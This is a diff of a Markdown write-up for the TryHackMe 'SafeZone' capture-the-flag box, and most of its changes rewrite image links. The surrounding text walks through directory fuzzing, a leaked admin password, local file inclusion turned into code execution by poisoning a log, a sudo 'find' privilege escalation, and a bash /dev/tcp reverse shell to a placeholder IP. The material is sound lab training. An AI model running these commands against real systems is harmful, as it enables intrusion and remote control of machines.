@@ -23,7 +23,7 @@ sticker: emoji//1f9ba
 
 Let's check the web application
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519124539.png)
+![](Pasted image 20250519124539.png)
 
 Seems like we need to add `safezone.thm` to `/etc/hosts`, after we add it, we can fuzz:
 
@@ -85,35 +85,35 @@ server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration:
 
 We got a bunch of stuff, let's read `note.txt` first:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519125535.png)
+![](Pasted image 20250519125535.png)
 
 
 Let's go to `register.php` to register an account:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519125628.png)
+![](Pasted image 20250519125628.png)
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519125701.png)
+![](Pasted image 20250519125701.png)
 
 
 We got some tabs, if we go to `news.php`, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519125732.png)
+![](Pasted image 20250519125732.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519125742.png)
+![](Pasted image 20250519125742.png)
 
 `contact.php` does not exist, let's go to `details.php`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519125820.png)
+![](Pasted image 20250519125820.png)
 
 Inside of here, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519125840.png)
+![](Pasted image 20250519125840.png)
 
 
 Based on the info, there seems to be some sort of `LFI` inside of here, let's use Caido:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519130341.png)
+![](Pasted image 20250519130341.png)
 
 I tried automating this using `caido automate` functionality but it failed, it seems like the `LFI` may only work as the admin user, let's try to fuzz again to check for any other directory we could be missing, in this case, i will change use `gobuster`:
 
@@ -139,7 +139,7 @@ Starting gobuster in directory enumeration mode
 
 We found the `/~files` directory, this must point to the same directory the admin was talking about on the note, let's go to `/~files/pass.txt` to check if its true:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519131015.png)
+![](Pasted image 20250519131015.png)
 
 Let's proceed to exploitation.
 
@@ -277,15 +277,15 @@ We got our credentials:
 admin:admin44admin
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519193418.png)
+![](Pasted image 20250519193418.png)
 
 We are now able to get access to the admin panel, let's check the `details.php` page:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519193521.png)
+![](Pasted image 20250519193521.png)
 
 As seen, it changed, `LFI` works now, knowing this, we can achieve `RCE` using this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519195900.png)
+![](Pasted image 20250519195900.png)
 
 Using `/var/log/apache2/access.log`, we can download a reverse shell into the server and execute it, we need to host the file in a python server, then use:
 
@@ -301,19 +301,19 @@ Before this, let's test the `rce`, we need to use this:
 
 On the `User-Agent`, then, send the request twice so we can see the `rce`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519203456.png)
+![](Pasted image 20250519203456.png)
 
 As seen, we got `rce`, let's do the command from before then:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519203554.png)
+![](Pasted image 20250519203554.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519203603.png)
+![](Pasted image 20250519203603.png)
 
 We got the request on our server, we only need to access the file through the `lfi` again and have our listener ready:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519203655.png)
+![](Pasted image 20250519203655.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519203704.png)
+![](Pasted image 20250519203704.png)
 
 We got our shell, let's begin privilege escalation.
 
@@ -336,7 +336,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519203804.png)
+![](Pasted image 20250519203804.png)
 
 With our stable shell, we can now look around the box, for example, if we use `sudo -l`, we get this:
 
@@ -354,7 +354,7 @@ User www-data may run the following commands on safezone:
 
 On `GTFOBINS`, we can find this info on how to exploit this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519203911.png)
+![](Pasted image 20250519203911.png)
 
 Let's do:
 
@@ -362,7 +362,7 @@ Let's do:
 sudo -u files /usr/bin/find . -exec /bin/bash \; -quit
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519204031.png)
+![](Pasted image 20250519204031.png)
 
 There we go, let's check our privileges again:
 
@@ -415,11 +415,11 @@ magic            (?)
 We got the credentials, let's switch to ssh:
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519211619.png)
+![](Pasted image 20250519211619.png)
 
 Let's use linpeas:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519211933.png)
+![](Pasted image 20250519211933.png)
 
 Something is running on port `8000`, most likely a website, let's use port tunneling to check the contents:
 
@@ -427,7 +427,7 @@ Something is running on port `8000`, most likely a website, let's use port tunne
 ssh -L 9000:localhost:8000 files@safezone.thm -fN
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519212024.png)
+![](Pasted image 20250519212024.png)
 
 It says forbidden but we can still fuzz, let's do it:
 
@@ -477,29 +477,29 @@ We got a login page:
 
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519212128.png)
+![](Pasted image 20250519212128.png)
 
 
 If we inspect the source code, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519212145.png)
+![](Pasted image 20250519212145.png)
 
 There's a `login.js` file, inside of it, we can find this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519212206.png)
+![](Pasted image 20250519212206.png)
 
 We got credentials, once we login, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519212235.png)
+![](Pasted image 20250519212235.png)
 
 We can write messages for `yash`, if we try some commands they don't work, such as id or whoami, but, we can use `echo` to create a file:
 
 
 
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519212359.png)
+![](Pasted image 20250519212359.png)
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519212410.png)
+![](Pasted image 20250519212410.png)
 
 As seen, it does create the file in our home, we can now create another file to send us a reverse shell as yash:
 
@@ -525,7 +525,7 @@ bash -i >& /dev/tcp/IP/9001 0>&1
 
 We now need to execute the file and get our shell if we have our listener ready:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519213847.png)
+![](Pasted image 20250519213847.png)
 
 We can now stabilize it again:
 
@@ -539,7 +539,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519213957.png)
+![](Pasted image 20250519213957.png)
 
 If we check our privileges, we can check this:
 
@@ -596,5 +596,5 @@ yash@safezone:/opt$ cat /home/yash/root.txt
 THM{63a9f0ea7bb98050796b649e85481845}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250519214356.png)
+![](Pasted image 20250519214356.png)
 
